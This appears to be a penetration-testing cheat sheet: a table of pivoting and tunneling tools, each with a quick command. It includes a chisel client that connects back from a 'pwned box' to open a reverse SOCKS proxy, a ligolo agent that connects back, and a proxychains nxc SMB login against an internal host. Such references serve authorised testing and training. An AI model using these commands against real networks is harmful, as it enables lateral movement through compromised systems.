# Pivoting & Tunneling

| Tool | What it's for | Quick command |
|---|---|---|
| **[chisel](https://github.com/jpillora/chisel)** | Fast TCP tunnel over HTTP — get a SOCKS proxy into a network segment you can't reach directly. | Server: `chisel server -p 8000 --reverse` · Client (from pwned box): `chisel client <your_ip>:8000 R:socks` |
| **[ligolo-ng](https://github.com/nicocha30/ligolo-ng)** | Tun-interface-based pivoting — feels like a real route into the target network rather than a SOCKS proxy, good for tools that don't proxy-chain well. | `proxy -laddr 0.0.0.0:11601 -selfcert` then agent connects back |
| **[sshuttle](https://github.com/sshuttle/sshuttle)** | VPN-like tunnel over plain SSH — simplest option when you've already got SSH creds on a pivot box. | `sshuttle -r user@<pivot_ip> <target_subnet>/24` |
| **[socat](http://www.dest-unreach.org/socat/)** | General-purpose relay — port forwarding, simple shell relays, when you need something more flexible than `ssh -L`. | `socat TCP-LISTEN:1234,fork TCP:<target>:80` |
| **proxychains** | Routes any tool's traffic through your SOCKS proxy (e.g. from chisel) — pairs with the above so nmap/nxc/etc can reach the far side. | `proxychains nxc smb <internal_ip> -u user -p pass` |
